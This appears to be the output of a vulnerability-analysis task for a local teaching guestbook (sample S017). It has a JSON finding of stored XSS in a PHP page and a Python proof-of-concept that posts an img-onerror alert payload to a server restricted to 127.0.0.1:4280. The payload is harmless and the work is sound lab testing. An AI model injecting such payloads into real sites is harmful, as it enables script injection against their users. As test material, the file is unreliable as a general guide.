@@ -1,0 +1,120 @@
+```json
+{
+  "sample_id": "S017",
+  "prediction": "vulnerable",
+  "vulnerability_type": "XSS",
+  "locations": [
+    "F01:0008",
+    "F01:0015",
+    "F01:0016",
+    "F01:0030",
+    "F01:0033",
+    "F01:0053"
+  ],
+  "evidence": {
+    "source": "F01:0008 从 $_POST['body'] 取得用户可控字符串，仅做非空和长度检查。",
+    "flow": "F01:0015-F01:0016 使用预处理语句将 body 写入 lab_guestbook；F01:0030-F01:0033 按 sample_id 读取最近留言；F01:0053 输出 body。",
+    "guard": "无效：F01:0016 的参数化绑定只防 SQL 注入；F01:0009 的长度/非空校验不进行 HTML 编码或净化；F01:0053 直接 echo，未使用 htmlspecialchars 等输出编码。",
+    "sink": "F01:0053 在 HTML 正文的 div 中直接输出 $message['body']，可形成存储型 XSS。"
+  },
+  "prerequisites": [
+    "本地教学留言板已部署，当前样本页面可通过 http://127.0.0.1:4280 下的实际 index.php 访问。",
+    "数据库 lab_guestbook 表可写，且当前 sample_id 为 S017。",
+    "浏览器可打开同一 URL 并人工观察页面标记或弹窗；无需登录。"
+  ],
+  "missing_context": [
+    "common/db_connect.php 未提供，但该文件仅用于数据库连接；当前 XSS 路径的写入、读取和输出代码在 F01 中可见。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "将 --url 设置为当前样本 index.php 的实际本地 URL，必须严格为 http://127.0.0.1:4280/ 下的地址；脚本会校验主机和端口并禁用重定向。步骤：1) 普通写入：POST 普通文本 S017 普通对照：无脚本标记，记录 303 或响应状态；2) 测试写入：POST 测试载荷 <img src=x onerror=\"document.body.setAttribute('data-s017','XSS_CONFIRMED');alert('S017_XSS_CONFIRMED')\">；3) 持久化后独立读取/渲染：再 GET 同一 URL，脚本只打印响应是否包含载荷字符串，这不等于浏览器执行；4) 人工在浏览器打开该 URL，普通对照应无弹窗且无 data-s017 标记，测试留言应触发 alert('S017_XSS_CONFIRMED') 或使 body 出现 data-s017=XSS_CONFIRMED；若浏览器未实际出现该标记/弹窗，则不能判断漏洞已触发。清理：由实验环境管理员在数据库中删除 sample_id='S017' 且 body 为上述普通/测试文本的记录，或按实验环境已有清理流程处理；脚本不执行删除。若页面无法在浏览器打开、JavaScript 被禁用或被 CSP 阻止，则无法判断浏览器执行结果。HTTP 200 或响应体包含 payload 均不能单独证明脚本执行。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import argparse
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+ALLOWED_HOST = "127.0.0.1"
+ALLOWED_PORT = 4280
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def validate_url(raw: str) -> str:
+    try:
+        parsed = urllib.parse.urlsplit(raw)
+        port = parsed.port
+    except ValueError as exc:
+        raise SystemExit(f"URL 端口无效: {exc}")
+    if parsed.scheme != "http":
+        raise SystemExit("目标必须使用 http://")
+    if parsed.hostname != ALLOWED_HOST or port != ALLOWED_PORT:
+        raise SystemExit("目标必须固定为 http://127.0.0.1:4280/ 下的地址")
+    if parsed.username or parsed.password:
+        raise SystemExit("目标 URL 不允许包含用户名或密码")
+    return raw
+
+
+def send(url: str, data: bytes | None = None):
+    headers = {"User-Agent": "S017-local-xss-check"}
+    method = "GET"
+    if data is not None:
+        method = "POST"
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+    req = urllib.request.Request(url, data=data, headers=headers, method=method)
+    opener = urllib.request.build_opener(NoRedirect)
+    try:
+        with opener.open(req, timeout=10) as resp:
+            body = resp.read().decode("utf-8", "replace")
+            return resp.status, body
+    except urllib.error.HTTPError as exc:
+        body = exc.read().decode("utf-8", "replace")
+        return exc.code, body
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="S017 本地存储型 XSS 验证脚本：只访问 127.0.0.1:4280，不跟随重定向。"
+    )
+    parser.add_argument(
+        "--url",
+        required=True,
+        help="当前样本 index.php 的实际本地 URL，例如 http://127.0.0.1:4280/实际路径/index.php",
+    )
+    args = parser.parse_args()
+    url = validate_url(args.url)
+
+    ordinary = "S017 普通对照：无脚本标记"
+    payload = (
+        "<img src=x onerror=\"document.body.setAttribute('data-s017','XSS_CONFIRMED');"
+        "alert('S017_XSS_CONFIRMED')\">"
+    )
+
+    status, _ = send(url, urllib.parse.urlencode({"body": ordinary}).encode("utf-8"))
+    print(f"普通写入 POST 状态: {status}")
+
+    status, _ = send(url, urllib.parse.urlencode({"body": payload}).encode("utf-8"))
+    print(f"测试写入 POST 状态: {status}")
+
+    status, body = send(url)
+    print(f"持久化后独立读取 GET 状态: {status}")
+    print("响应体中是否出现测试载荷字符串（仅脚本观察，不等于浏览器执行）:", payload in body)
+    print(f"请人工在浏览器打开并观察: {url}")
+    print("普通对照预期：显示普通文本，无弹窗，无 data-s017 标记。")
+    print("测试预期：应出现 alert('S017_XSS_CONFIRMED') 或 body 的 data-s017=XSS_CONFIRMED。")
+    print("若浏览器未实际出现上述标记/弹窗，则不能判断漏洞已触发。")
+    print("清理：由实验环境管理员按 sample_id='S017' 和上述普通/测试 body 内容清理数据库记录；本脚本不执行删除。")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
